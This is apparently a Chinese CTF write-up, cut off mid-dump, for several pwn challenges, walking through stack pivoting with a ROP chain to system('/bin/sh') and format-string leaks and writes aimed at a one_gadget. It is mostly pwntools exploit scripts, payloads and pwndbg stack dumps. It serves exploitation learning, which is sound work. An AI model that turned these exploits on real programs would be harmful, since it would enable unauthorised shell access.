 RBP  0x404780 (bss_buffer+1760) ◂— 0 RSP  0x404868 (bss_buffer+1992) ◂— 0*RIP  0x401275 (vuln+109) ◂— call read@plt ► 0x401275       &lt;vuln+109&gt;    call   read@plt                    &lt;read@plt&gt;        fd: 0 (pipe:[82862])        buf: 0x404740 (bss_buffer+1696) ◂— 0        nbytes: 0x5000:0000│ rsp 0x404868 (bss_buffer+1992) ◂— 0... ↓        2 skipped03:0018│+100 0x404880 (bss_buffer+2016) —▸ 0x404840 (bss_buffer+1952) —▸ 0x404780 (bss_buffer+1760) ◂— 004:0020│+108 0x404888 (bss_buffer+2024) —▸ 0x40127b (vuln+115) ◂— leave

第三次read结束后

 RBP  0x404780 (bss_buffer+1760) —▸ 0x404740 (bss_buffer+1696) —▸ 0x404680 (bss_buffer+1504) ◂— 0 RSP  0x404868 (bss_buffer+1992) ◂— 0*RIP  0x40127b (vuln+115) ◂— leave ► 0x40127b &lt;vuln+115&gt;    leave 00:0000│ rsp 0x404868 (bss_buffer+1992) ◂— 0... ↓        2 skipped03:0018│+100 0x404880 (bss_buffer+2016) —▸ 0x404840 (bss_buffer+1952) —▸ 0x404780 (bss_buffer+1760) —▸ 0x404740 (bss_buffer+1696) —▸ 0x404680 (bss_buffer+1504) ◂— ...04:0020│+108 0x404888 (bss_buffer+2024) —▸ 0x40127b (vuln+115) ◂— leave00:0000│ rsi 0x404740 (bss_buffer+1696) —▸ 0x404680 (bss_buffer+1504) ◂— 001:0008│-038 0x404748 (bss_buffer+1704) —▸ 0x40119f (magic+9) ◂— ret02:0010│-030 0x404750 (bss_buffer+1712) —▸ 0x40119e (magic+8) ◂— pop rdi03:0018│-028 0x404758 (bss_buffer+1720) —▸ 0x7b3a0bdd8678 ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */04:0020│-020 0x404760 (bss_buffer+1728) —▸ 0x7b3a0bc50d70 (system) ◂— endbr6405:0028│-018 0x404768 (bss_buffer+1736) ◂— 0... ↓        2 skipped08:0040│ rbp 0x404780 (bss_buffer+1760) —▸ 0x404740 (bss_buffer+1696) —▸ 0x404680 (bss_buffer+1504) ◂— 009:0048│+008 0x404788 (bss_buffer+1768) —▸ 0x40127b (vuln+115) ◂— leave

第三次leave后

*RBP  0x404740 (bss_buffer+1696) —▸ 0x404680 (bss_buffer+1504) ◂— 0*RSP  0x404788 (bss_buffer+1768) —▸ 0x40127b (vuln+115) ◂— leave*RIP  0x40127c (vuln+116) ◂— ret ► 0x40127c &lt;vuln+116&gt;    ret                                &lt;vuln+115&gt;     ↓   0x40127b &lt;vuln+115&gt;    leave   0x40127c &lt;vuln+116&gt;    ret                                &lt;vuln+115&gt; 00:0000│ rsp 0x404788 (bss_buffer+1768) —▸ 0x40127b (vuln+115) ◂— leave

第三次ret后，第三次ret返回的也是我们控制的leave

 RBP  0x404740 (bss_buffer+1696) —▸ 0x404680 (bss_buffer+1504) ◂— 0*RSP  0x404790 (bss_buffer+1776) —▸ 0x7b3a0bc8aeed (_IO_file_write+45) ◂— test rax, rax*RIP  0x40127b (vuln+115) ◂— leave ► 0x40127b       &lt;vuln+115&gt;    leave   0x40127c       &lt;vuln+116&gt;    ret                                &lt;magic+9&gt;    ↓   0x40119f       &lt;magic+9&gt;     ret                                &lt;magic+8&gt;    ↓   0x40119e       &lt;magic+8&gt;     pop    rdi     RDI =&gt; 0x7b3a0bdd8678   0x40119f       &lt;magic+9&gt;     ret                                &lt;system&gt;00:0000│ rsp 0x404790 (bss_buffer+1776) —▸ 0x7b3a0bc8aeed (_IO_file_write+45) ◂— test rax, rax

控制执行的leave后

*RBP  0x404680 (bss_buffer+1504) ◂— 0*RSP  0x404748 (bss_buffer+1704) —▸ 0x40119f (magic+9) ◂— ret*RIP  0x40127c (vuln+116) ◂— ret ► 0x40127c       &lt;vuln+116&gt;    ret                                &lt;magic+9&gt;    ↓   0x40119f       &lt;magic+9&gt;     ret                                &lt;magic+8&gt;    ↓   0x40119e       &lt;magic+8&gt;     pop    rdi     RDI =&gt; 0x7b3a0bdd8678   0x40119f       &lt;magic+9&gt;     ret                                &lt;system&gt;00:0000│ rsp 0x404748 (bss_buffer+1704) —▸ 0x40119f (magic+9) ◂— ret01:0008│+0d0 0x404750 (bss_buffer+1712) —▸ 0x40119e (magic+8) ◂— pop rdi02:0010│+0d8 0x404758 (bss_buffer+1720) —▸ 0x7b3a0bdd8678 ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */03:0018│+0e0 0x404760 (bss_buffer+1728) —▸ 0x7b3a0bc50d70 (system) ◂— endbr6404:0020│+0e8 0x404768 (bss_buffer+1736) ◂— 0... ↓        2 skipped07:0038│+100 0x404780 (bss_buffer+1760) —▸ 0x404740 (bss_buffer+1696) —▸ 0x404680 (bss_buffer+1504) ◂— 008:0040│+108 0x404788 (bss_buffer+1768) —▸ 0x40127b (vuln+115) ◂— leave

控制执行的ret后

 RBP  0x404680 (bss_buffer+1504) ◂— 0*RSP  0x404750 (bss_buffer+1712) —▸ 0x40119e (magic+8) ◂— pop rdi*RIP  0x40119f (magic+9) ◂— ret► 0x40119f &lt;magic+9&gt;    ret                                &lt;magic+8&gt;    ↓   0x40119e &lt;magic+8&gt;    pop    rdi     RDI =&gt; 0x7b3a0bdd8678   0x40119f &lt;magic+9&gt;    ret                                &lt;magic+8&gt;    ↓   0x40119e &lt;magic+8&gt;    pop    rdi   0x40119f &lt;magic+9&gt;    ret                                &lt;magic+8&gt;    ↓   0x40119e &lt;magic+8&gt;    pop    rdi00:0000│ rsp 0x404750 (bss_buffer+1712) —▸ 0x40119e (magic+8) ◂— pop rdi01:0008│+0d8 0x404758 (bss_buffer+1720) —▸ 0x7b3a0bdd8678 ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */02:0010│+0e0 0x404760 (bss_buffer+1728) —▸ 0x7b3a0bc50d70 (system) ◂— endbr6403:0018│+0e8 0x404768 (bss_buffer+1736) ◂— 0... ↓        2 skipped06:0030│+100 0x404780 (bss_buffer+1760) —▸ 0x404740 (bss_buffer+1696) —▸ 0x404680 (bss_buffer+1504) ◂— 007:0038│+108 0x404788 (bss_buffer+1768) —▸ 0x40127b (vuln+115) ◂— leave

magic执行

 RBP  0x404680 (bss_buffer+1504) ◂— 0*RSP  0x404758 (bss_buffer+1720) —▸ 0x7b3a0bdd8678 ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */*RIP  0x40119e (magic+8) ◂— pop rdi ► 0x40119e       &lt;magic+8&gt;     pop    rdi     RDI =&gt; 0x7b3a0bdd8678   0x40119f       &lt;magic+9&gt;     ret                                &lt;system&gt;    ↓   0x7b3a0bc50d70 &lt;system&gt;      endbr64   0x7b3a0bc50d74 &lt;system+4&gt;    test   rdi, rdi     0x7b3a0bdd8678 &amp; 0x7b3a0bdd8678     EFLAGS =&gt; 0x206 [ cf PF af zf sf IF df of ac ]   0x7b3a0bc50d77 &lt;system+7&gt;  ✘ je     system+16                   &lt;system+16&gt;00:0000│ rsp 0x404758 (bss_buffer+1720) —▸ 0x7b3a0bdd8678 ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */01:0008│+0e0 0x404760 (bss_buffer+1728) —▸ 0x7b3a0bc50d70 (system) ◂— endbr6402:0010│+0e8 0x404768 (bss_buffer+1736) ◂— 0... ↓        2 skipped05:0028│+100 0x404780 (bss_buffer+1760) —▸ 0x404740 (bss_buffer+1696) —▸ 0x404680 (bss_buffer+1504) ◂— 006:0030│+108 0x404788 (bss_buffer+1768) —▸ 0x40127b (vuln+115) ◂— leave

system执行

 RBP  0x404680 (bss_buffer+1504) ◂— 0*RSP  0x404760 (bss_buffer+1728) —▸ 0x7b3a0bc50d70 (system) ◂— endbr64*RIP  0x40119f (magic+9) ◂— ret ► 0x40119f       &lt;magic+9&gt;     ret                                &lt;system&gt;    ↓   0x7b3a0bc50d70 &lt;system&gt;      endbr64   0x7b3a0bc50d74 &lt;system+4&gt;    test   rdi, rdi     0x7b3a0bdd8678 &amp; 0x7b3a0bdd8678     EFLAGS =&gt; 0x206 [ cf PF af zf sf IF df of ac ]   0x7b3a0bc50d77 &lt;system+7&gt;  ✘ je     system+16                   &lt;system+16&gt;   0x7b3a0bc50d79 &lt;system+9&gt;    jmp    0x7b3a0bc50900              &lt;0x7b3a0bc50900&gt;00:0000│ rsp 0x404760 (bss_buffer+1728) —▸ 0x7b3a0bc50d70 (system) ◂— endbr6401:0008│+0e8 0x404768 (bss_buffer+1736) ◂— 0... ↓        2 skipped04:0020│+100 0x404780 (bss_buffer+1760) —▸ 0x404740 (bss_buffer+1696) —▸ 0x404680 (bss_buffer+1504) ◂— 005:0028│+108 0x404788 (bss_buffer+1768) —▸ 0x40127b (vuln+115) ◂— leave
上面就是我们的全部过程，看起来比较复杂，但是思路是很清晰的
p = start()leave_retn_addr=0x40127bstart_addr=0x401264pop_rdi_ret_addr=0x40119eputs_got=0x404018puts_plt=0x401070write_addr=0x404880p.recvuntil(b&quot;&gt; &quot;)payload1=b&#x27;a&#x27;*0x40            #填充缓存区payload1+=p64(write_addr)     #转移rbppayload1+=p64(start_addr)     #重新执行readp.send(payload1)payload2=p64(write_addr-0x100)     #再次转移rbp，这行所在是write_addr-0x40payload2+=p64(pop_rdi_ret_addr)    #控制参数payload2+=p64(puts_got)            #输出got表地址payload2+=p64(puts_plt)            #执行putspayload2+=p64(start_addr)          #重新执行readpayload2+=p64(0)*3                 #填充payload2+=p64(write_addr-0x40)     #指向payload2第一个8字节，程序原有的leave将rbp移到write_addr-0x40payload2+=p64(leave_retn_addr)     #重新执行leave;ret，leave使rsp指向rbp+8,rbp指向write_addr-0x100，ret将pop rdi弹入rip执行p.send(payload2)data = p.recvuntil(b&#x27;\x0a&#x27;)[:-1]puts_addr = u64(data[-6:].ljust(8, b&#x27;\x00&#x27;))log.success(hex(puts_addr))libc_base=puts_addr-libc.sym[&quot;puts&quot;]sys_addr=libc_base+libc.sym[&quot;system&quot;]bin_addr=libc_base+next(libc.search(b&quot;/bin/sh&quot;))payload3=p64(write_addr-0x200)      #转移rbp，这行所在是write_addr-0x140payload3+=p64(pop_rdi_ret_addr+1)   #ret栈对齐payload3+=p64(pop_rdi_ret_addr)     #控制参数payload3+=p64(bin_addr)             #/bin/sh\x00payload3+=p64(sys_addr)             #systempayload3+=p64(0)*3                  #填充payload3+=p64(write_addr-0x140)     #指向payload3第一个8字节，程序原有的leave将rbp移到write_addr-0x140payload3+=p64(leave_retn_addr)      #重新执行leave;ret，leave使rsp指向rbp+8,rbp指向write_addr-0x200，ret将pop rdi弹入rip执行p.send(payload3)p.interactive()
fmt
int __fastcall main(int argc, const char **argv, const char **envp)&#123;  char *s2_1; // [rsp+8h] [rbp-88h]  char s1[16]; // [rsp+10h] [rbp-80h] BYREF  char s2[16]; // [rsp+20h] [rbp-70h] BYREF  char s[88]; // [rsp+30h] [rbp-60h] BYREF  unsigned __int64 v8; // [rsp+88h] [rbp-8h]  v8 = __readfsqword(0x28u);  init(argc, argv, envp);  s2_1 = (char *)malloc(0x20uLL);  generate(s2, 5LL);  generate(s2_1, 5LL);  puts(&quot;Hey there, little one, what&#x27;s your name?&quot;);  fgets(s, 80, stdin);  printf(&quot;Nice to meet you,&quot;);  printf(s);  puts(&quot;I buried two treasures on the stack.Can you find them?&quot;);  fgets(s1, 8, stdin);  if ( strncmp(s1, s2, 5uLL) )    lose();  puts(&quot;Yeah,another one?&quot;);  fgets(s1, 8, stdin);  if ( strncmp(s1, s2_1, 5uLL) )    lose();  win();  return 0;&#125;
unsigned __int64 __fastcall generate(__int64 a1, unsigned __int64 i_1)&#123;  unsigned __int64 i; // [rsp+18h] [rbp-48h]  char abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ[56]; // [rsp+20h] [rbp-40h] BYREF  unsigned __int64 v5; // [rsp+58h] [rbp-8h]  v5 = __readfsqword(0x28u);  strcpy(abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ, &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;);  for ( i = 0LL; i &lt; i_1; ++i )    *(_BYTE *)(a1 + i) = abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ[(int)arc4random_uniform(52LL)];  *(_BYTE *)(a1 + i_1) = 0;  return v5 - __readfsqword(0x28u);&#125;
int win()&#123;  puts(&quot;You got it!&quot;);  return system(&quot;/bin/sh&quot;);&#125;
运行完generate后
00:0000│ rsp 0x7ffcc2f736c0 ◂— 0xc00001:0008│-088 0x7ffcc2f736c8 —▸ 0x654944ad82a0 ◂— 0x4e4c654b67 /* &#x27;gKeLN&#x27; */02:0010│-080 0x7ffcc2f736d0 ◂— 0x1b0000003:0018│-078 0x7ffcc2f736d8 ◂— 0x30000004:0020│-070 0x7ffcc2f736e0 ◂— 0x4e6966444f /* &#x27;ODfiN&#x27; */05:0028│-068 0x7ffcc2f736e8 —▸ 0x7ffcc2f73718 ◂— 006:0030│-060 0x7ffcc2f736f0 ◂— 0xc50000000607:0038│-058 0x7ffcc2f736f8 ◂— 0
可以看到一个密码储存在一个地址处，可以用%s泄露，另一个密码就是栈上的地址，可以用%p泄露
计算好偏移并接收泄露的密码，再发送出去就可以了
p = start()p.recvuntil(b&quot;Hey there, little one, what&#x27;s your name?\n&quot;)payload=b&#x27;A&#x27;*8+b&#x27;%7$s&#x27;+b&#x27;%10$p&#x27;p.sendline(payload)p.recvuntil(b&quot;Nice to meet you,&quot;)p.recvuntil(b&#x27;A&#x27;*8)s2_1= p.recv(5)hex_str=p.recv(12)hex_int = int(hex_str, 16)byte_data = hex_int.to_bytes(length=5, byteorder=&#x27;little&#x27;)s2 = byte_data.decode(&#x27;ascii&#x27;, errors=&#x27;ignore&#x27;)p.recvuntil(b&quot;I buried two treasures on the stack.Can you find them?\n&quot;)p.sendline(s2)p.recvuntil(b&quot;Yeah,another one?\n&quot;)p.sendline(s2_1)p.interactive()
fmt_s
这题是我认为这次比赛pwn题最难的一道
int __fastcall main(int argc, const char **argv, const char **envp)&#123;  int i; // [rsp+Ch] [rbp-4h]  init(argc, argv, envp);  puts(&quot;You&#x27;re walking down the road when a monster appear.&quot;);  for ( i = 1; i &lt;= 3 &amp;&amp; !flag; ++i )    talk();  if ( (unsigned __int64)atk &lt;= 0x1BF52 )    puts(&quot;You&#x27;ve been eaten by the monster.&quot;);  else    he();  return 0;&#125;
__int64 talk()&#123;  puts(&quot;You start talking to him...&quot;);  flag ^= 1u;  read(0, fmt, 0x20uLL);  printf(fmt);  puts(&quot;?&quot;);  puts(&quot;You enraged the monster-prepare for battle!&quot;);  return my_read(&amp;atk, 8LL);&#125;
unsigned __int64 he()&#123;  char command[6]; // [rsp+2h] [rbp-Eh] BYREF  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  qmemcpy(command, &quot;a_flag&quot;, sizeof(command));  puts(&quot;The monster is defeated, and you obtain: flag?&quot;);  system(command);  return v2 - __readfsqword(0x28u);
fmt写入在bss段上，属于一道非栈上格式化字符串漏洞题
.bss:00000000004040A0                 public atk.bss:00000000004040A0 atk             dq ?                    ; DATA XREF: talk+7A↑o.bss:00000000004040A0                                         ; main:loc_4013BE↑r.bss:00000000004040A8                 public flag.bss:00000000004040A8 flag            dd ?                    ; DATA XREF: talk+1B↑r.bss:00000000004040A8                                         ; talk+24↑w ....bss:00000000004040AC                 align 20h.bss:00000000004040C0                 public fmt.bss:00000000004040C0 ; char fmt[256].bss:00000000004040C0 fmt             db 100h dup(?)          ; DATA XREF: talk+2F↑o.bss:00000000004040C0                                         ; talk+43↑o.bss:00000000004040C0 _bss            ends
没有后门函数，最好的方法就是使用one_gadget，修改返回地址来达到劫持程序的目的
非栈上格式化字符串一般是打一个指针串，就是先修改一个指针指向可以修改的地方，然后修改这个指针指向的指针的内容
00:0000 |  rsp 0x7ffd9784e118 → 0x40127c (vuln+101) ← lea rax, [rip + 0x2ddd]01:0008 | -010 0x7ffd9784e120 → 0x40129e (main) ← endbr6402:0010 | -008 0x7ffd9784e128 ← 0x3004011fa03:0018 |  rbp 0x7ffd9784e130 → 0x7ffd9784e140 ← 104:0020 | +008 0x7ffd9784e138 → `0x4012ba (main+28)` ← mov eax, 005:0028 | +010 0x7ffd9784e140 ← 106:0030 | +018 0x7ffd9784e148 → 0x7fecc58f6d90 (__libc_start_call_main+128) ← mov edi, eax07:0038 | +020 0x7ffd9784e150 ← 008:0040 | +028 0x7ffd9784e158 → 0x40129e (main) ← endbr6409:0048 | +030 0x7ffd9784e160 ← 0x19784e2400a:0050 | +038 `0x7ffd9784e168 → 0x7ffd9784e258 → 0x7ffd9785011b` ← 0x4853006e77702f2e / * &#x27;./pwn&#x27; */0b:0058 | +040 0x7ffd9784e170 ← 00c:0060 | +048 0x7ffd9784e178 ← 0xe37404db4f04c1050d:0068 | +050 0x7ffd9784e180 → 0x7ffd9784e258 → 0x7ffd9785011b ← 0x4853006e77702f2e / * &#x27;./pwn&#x27; */0e:0070 | +058 0x7ffd9784e188 → 0x40129e (main) ← endbr640f:0078 | +060 0x7ffd9784e190 → 0x403db8 (__do_global_dtors_aux_fini_array_entry) → 0x401180 (__do_global_dtors_aux) ← endbr64
比如说，上面0x4012ba (main+28)是 vul 函数的返回地址，我们是不能直接修改这个值的
栈地址 –&gt;addr2–&gt;addr3，已知栈地址是第几个参数，我们能修改的是 addr3
栈上一般都有一些符合上述形式的链，如0a:0050 | +038 0x7ffd9784e168 → 0x7ffd9784e258 → 0x7ffd9785011b
我们可以修改 addr3 为 0x7ffd9784e138 (vul 函数返回地址在栈上的位置)
这样的话，我们只需要知道 addr2 是第几个参数，那么我们就可以通过 addr2–&gt;addr3–&gt;vul_ret_addr 来修改 vul 函数的返回地址
下面演示的是“诸葛连弩”的打法：
栈上一般都会有可以获得libc基地址的东西，比如说__libc_start_main
我们先来看看talk函数的栈内容吧
00:0000│ rsp 0x7ffea6500670 —▸ 0x7ffea65007b8 —▸ 0x7ffea65029ee ◂— &#x27;/home/ubuntu/Moectf/fmt_s/pwn_patched&#x27;01:0008│-008 0x7ffea6500678 —▸ 0x40136f (main) ◂— endbr6402:0010│ rbp 0x7ffea6500680 —▸ 0x7ffea65006a0 ◂— 103:0018│+008 0x7ffea6500688 —▸ 0x4013b1 (main+66) ◂— add dword ptr [rbp - 4], 104:0020│+010 0x7ffea6500690 ◂— 0x100005:0028│+018 0x7ffea6500698 ◂— 0x10040111006:0030│+020 0x7ffea65006a0 ◂— 107:0038│+028 0x7ffea65006a8 —▸ 0x7913ed829d90 ◂— mov edi, eax08:0040│+030 0x7ffea65006b0 ◂— 009:0048│+038 0x7ffea65006b8 —▸ 0x40136f (main) ◂— endbr640a:0050│+040 0x7ffea65006c0 ◂— 0x1a65007a00b:0058│+048 0x7ffea65006c8 —▸ 0x7ffea65007b8 —▸ 0x7ffea65029ee ◂— &#x27;/home/ubuntu/Moectf/fmt_s/pwn_patched&#x27;0c:0060│+050 0x7ffea65006d0 ◂— 00d:0068│+058 0x7ffea65006d8 ◂— 0x6d26ff8a1914566c0e:0070│+060 0x7ffea65006e0 —▸ 0x7ffea65007b8 —▸ 0x7ffea65029ee ◂— &#x27;/home/ubuntu/Moectf/fmt_s/pwn_patched&#x27;0f:0078│+068 0x7ffea65006e8 —▸ 0x40136f (main) ◂— endbr6410:0080│+070 0x7ffea65006f0 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr6411:0088│+078 0x7ffea65006f8 —▸ 0x7913edace040 (_rtld_global) —▸ 0x7913edacf2e0 ◂— 012:0090│+080 0x7ffea6500700 ◂— 0x92dbb32a1476566c13:0098│+088 0x7ffea6500708 ◂— 0x9f01248f239e566c14:00a0│+090 0x7ffea6500710 ◂— 0x79130000000015:00a8│+098 0x7ffea6500718 ◂— 0... ↓        3 skipped19:00c8│+0b8 0x7ffea6500738 ◂— 0xb0add8007ab876001a:00d0│+0c0 0x7ffea6500740 ◂— 01b:00d8│+0c8 0x7ffea6500748 —▸ 0x7913ed829e40 (__libc_start_main+128) ◂— mov r15, qword ptr [rip + 0x1f0159]1c:00e0│+0d0 0x7ffea6500750 —▸ 0x7ffea65007c8 —▸ 0x7ffea6502a14 ◂— &#x27;SHELL=/bin/bash&#x27;1d:00e8│+0d8 0x7ffea6500758 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr641e:00f0│+0e0 0x7ffea6500760 —▸ 0x7913edacf2e0 ◂— 01f:00f8│+0e8 0x7ffea6500768 ◂— 020:0100│+0f0 0x7ffea6500770 ◂— 021:0108│+0f8 0x7ffea6500778 —▸ 0x401110 (_start) ◂— endbr6422:0110│+100 0x7ffea6500780 —▸ 0x7ffea65007b0 ◂— 123:0118│+108 0x7ffea6500788 ◂— 024:0120│+110 0x7ffea6500790 ◂— 025:0128│+118 0x7ffea6500798 —▸ 0x401135 (_start+37) ◂— hlt26:0130│+120 0x7ffea65007a0 —▸ 0x7ffea65007a8 ◂— 0x1c27:0138│+128 0x7ffea65007a8 ◂— 0x1c28:0140│+130 0x7ffea65007b0 ◂— 129:0148│ r12 0x7ffea65007b8 —▸ 0x7ffea65029ee ◂— &#x27;/home/ubuntu/Moectf/fmt_s/pwn_patched&#x27;2a:0150│+140 0x7ffea65007c0 ◂— 02b:0158│+148 0x7ffea65007c8 —▸ 0x7ffea6502a14 ◂— &#x27;SHELL=/bin/bash&#x27;2c:0160│+150 0x7ffea65007d0 —▸ 0x7ffea6502a24 ◂— &#x27;COLORTERM=truecolor&#x27;
从这里可以得到libc基址
1b:00d8│+0c8 0x7ffea6500748 —▸ 0x7913ed829e40 (__libc_start_main+128)
偏移量是33，使用%33$p将地址输出出来并计算libc基址得到one_gadget地址
观察发现07:0038│+028 0x7ffea65006a8 —▸ 0x7913ed829d90 ◂— mov edi, eax是主函数的返回地址
偏移量是13，使用%13$p将地址输出出来便于修改为one_gadget
再将rbp的地址打印出来，便于修改rbp来达成one_gadget实现条件
02:0010│ rbp 0x7ffea6500680 —▸ 0x7ffea65006a0 ◂— 1
偏移量是8，打印 0x7ffea65006a0，再减去0x20得到rbp地址
另外要不断执行talk利用漏洞，需要注意for ( i = 1; i &lt;= 3 &amp;&amp; !flag; ++i )
每次执行都有异或操作flag ^= 1u;
需要我们每次利用都要使flag为0，怎么修改呢？
观察到
.bss:00000000004040A0 atk             dq ?                    ; DATA XREF: talk+7A↑o.bss:00000000004040A0                                         ; main:loc_4013BE↑r.bss:00000000004040A8                 public flag.bss:00000000004040A8 flag            dd ?                    ; DATA XREF: talk+1B↑r.bss:00000000004040A8                                         ; talk+24↑w ...
return my_read(&amp;atk, 8LL);
atk可以覆盖flag，于是我使用fffffff0来将flag覆盖为0
我们还需要无限次操作，修改i是必要的，此时我们只剩下两次操作机会，相当于只能修改一次任意地址的任意内容
注意到i是栈上的，第一次我们修改一个三连以上指针的第三个指针为i的符号位地址，第二次利用第二个指针来修改i的内容
这是第二次read前
00:0000│ rsp 0x7ffea6500670 —▸ 0x7ffea65007b8 —▸ 0x7ffea65029ee ◂— &#x27;/home/ubuntu/Moectf/fmt_s/pwn_patched&#x27;01:0008│-008 0x7ffea6500678 ◂— 0x80040136f02:0010│ rbp 0x7ffea6500680 —▸ 0x7ffea65006a0 ◂— 103:0018│+008 0x7ffea6500688 —▸ 0x4013b1 (main+66) ◂— add dword ptr [rbp - 4], 104:0020│+010 0x7ffea6500690 ◂— 0x100005:0028│+018 0x7ffea6500698 ◂— 0x20040111006:0030│ r9  0x7ffea65006a0 ◂— 107:0038│+028 0x7ffea65006a8 —▸ 0x7913ed829d90 ◂— mov edi, eax
可以看见
int i; // [rsp+Ch] [rbp-4h]与05:0028│+018 0x7ffea6500698 ◂— 0x200401110，这个2正是存放在主函数的栈上的i
所以地址是rbp+0x18，又因为要改的是符号位，所以地址是rbp+0x18+7
详细演示一下这段代码的作用
p.recvuntil(b&quot;You start talking to him...\n&quot;)payload2=b&quot;%&quot; + str(i_addr).encode(&quot;utf-8&quot;) + b&quot;c%17$hn\x00&quot;p.send(payload2)p.recvuntil(b&quot;You enraged the monster-prepare for battle!\n&quot;)p.send(b&quot;fffffff0&quot;)p.recvuntil(b&quot;You start talking to him...\n&quot;)payload3=b&quot;%&quot; + str(0xff).encode(&quot;utf-8&quot;) + b&quot;c%47$hhn&quot;p.send(payload3)p.recvuntil(b&quot;You enraged the monster-prepare for battle!\n&quot;)p.send(b&quot;fffffff0&quot;)
第二次printf前
00:0000│ rsp 0x7ffea6500670 —▸ 0x7ffea65007b8 —▸ 0x7ffea65029ee ◂— &#x27;/home/ubuntu/Moectf/fmt_s/pwn_patched&#x27;01:0008│-008 0x7ffea6500678 ◂— 0x80040136f02:0010│ rbp 0x7ffea6500680 —▸ 0x7ffea65006a0 ◂— 103:0018│+008 0x7ffea6500688 —▸ 0x4013b1 (main+66) ◂— add dword ptr [rbp - 4], 104:0020│+010 0x7ffea6500690 ◂— 0x100005:0028│+018 0x7ffea6500698 ◂— 0x20040111006:0030│ r9  0x7ffea65006a0 ◂— 107:0038│+028 0x7ffea65006a8 —▸ 0x7913ed829d90 ◂— mov edi, eax08:0040│+030 0x7ffea65006b0 ◂— 009:0048│+038 0x7ffea65006b8 —▸ 0x40136f (main) ◂— endbr640a:0050│+040 0x7ffea65006c0 ◂— 0x1a65007a00b:0058│+048 0x7ffea65006c8 —▸ 0x7ffea65007b8 —▸ 0x7ffea65029ee ◂— &#x27;/home/ubuntu/Moectf/fmt_s/pwn_patched&#x27;0c:0060│+050 0x7ffea65006d0 ◂— 00d:0068│+058 0x7ffea65006d8 ◂— 0x6d26ff8a1914566c0e:0070│+060 0x7ffea65006e0 —▸ 0x7ffea65007b8 —▸ 0x7ffea65029ee ◂— &#x27;/home/ubuntu/Moectf/fmt_s/pwn_patched&#x27;0f:0078│+068 0x7ffea65006e8 —▸ 0x40136f (main) ◂— endbr6410:0080│+070 0x7ffea65006f0 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr6411:0088│+078 0x7ffea65006f8 —▸ 0x7913edace040 (_rtld_global) —▸ 0x7913edacf2e0 ◂— 012:0090│+080 0x7ffea6500700 ◂— 0x92dbb32a1476566c13:0098│+088 0x7ffea6500708 ◂— 0x9f01248f239e566c14:00a0│+090 0x7ffea6500710 ◂— 0x79130000000015:00a8│+098 0x7ffea6500718 ◂— 0... ↓        3 skipped19:00c8│+0b8 0x7ffea6500738 ◂— 0xb0add8007ab876001a:00d0│+0c0 0x7ffea6500740 ◂— 01b:00d8│+0c8 0x7ffea6500748 —▸ 0x7913ed829e40 (__libc_start_main+128) ◂— mov r15, qword ptr [rip + 0x1f0159]1c:00e0│+0d0 0x7ffea6500750 —▸ 0x7ffea65007c8 —▸ 0x7ffea6502a14 ◂— &#x27;SHELL=/bin/bash&#x27;1d:00e8│+0d8 0x7ffea6500758 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr641e:00f0│+0e0 0x7ffea6500760 —▸ 0x7913edacf2e0 ◂— 01f:00f8│+0e8 0x7ffea6500768 ◂— 020:0100│+0f0 0x7ffea6500770 ◂— 021:0108│+0f8 0x7ffea6500778 —▸ 0x401110 (_start) ◂— endbr6422:0110│+100 0x7ffea6500780 —▸ 0x7ffea65007b0 ◂— 123:0118│+108 0x7ffea6500788 ◂— 024:0120│+110 0x7ffea6500790 ◂— 025:0128│+118 0x7ffea6500798 —▸ 0x401135 (_start+37) ◂— hlt26:0130│+120 0x7ffea65007a0 —▸ 0x7ffea65007a8 ◂— 0x1c27:0138│+128 0x7ffea65007a8 ◂— 0x1c28:0140│+130 0x7ffea65007b0 ◂— 129:0148│ r12 0x7ffea65007b8 —▸ 0x7ffea65029ee ◂— &#x27;/home/ubuntu/Moectf/fmt_s/pwn_patched&#x27;2a:0150│+140 0x7ffea65007c0 ◂— 02b:0158│+148 0x7ffea65007c8 —▸ 0x7ffea6502a14 ◂— &#x27;SHELL=/bin/bash&#x27;2c:0160│+150 0x7ffea65007d0 —▸ 0x7ffea6502a24 ◂— &#x27;COLORTERM=truecolor&#x27;
printf后
00:0000│ rsp 0x7ffea6500670 —▸ 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x10001:0008│-008 0x7ffea6500678 ◂— 0x80040136f02:0010│ rbp 0x7ffea6500680 —▸ 0x7ffea65006a0 ◂— 103:0018│+008 0x7ffea6500688 —▸ 0x4013b1 (main+66) ◂— add dword ptr [rbp - 4], 104:0020│+010 0x7ffea6500690 ◂— 0x100005:0028│+018 0x7ffea6500698 ◂— 0x20040111006:0030│+020 0x7ffea65006a0 ◂— 107:0038│+028 0x7ffea65006a8 —▸ 0x7913ed829d90 ◂— mov edi, eax08:0040│+030 0x7ffea65006b0 ◂— 009:0048│+038 0x7ffea65006b8 —▸ 0x40136f (main) ◂— endbr640a:0050│+040 0x7ffea65006c0 ◂— 0x1a65007a00b:0058│+048 0x7ffea65006c8 —▸ 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x1000c:0060│+050 0x7ffea65006d0 ◂— 00d:0068│+058 0x7ffea65006d8 ◂— 0x6d26ff8a1914566c0e:0070│+060 0x7ffea65006e0 —▸ 0x7ffea65007b8 —▸ 0x7ffea650069f ◂— 0x1000f:0078│+068 0x7ffea65006e8 —▸ 0x40136f (main) ◂— endbr6410:0080│+070 0x7ffea65006f0 —▸ 0x403e00 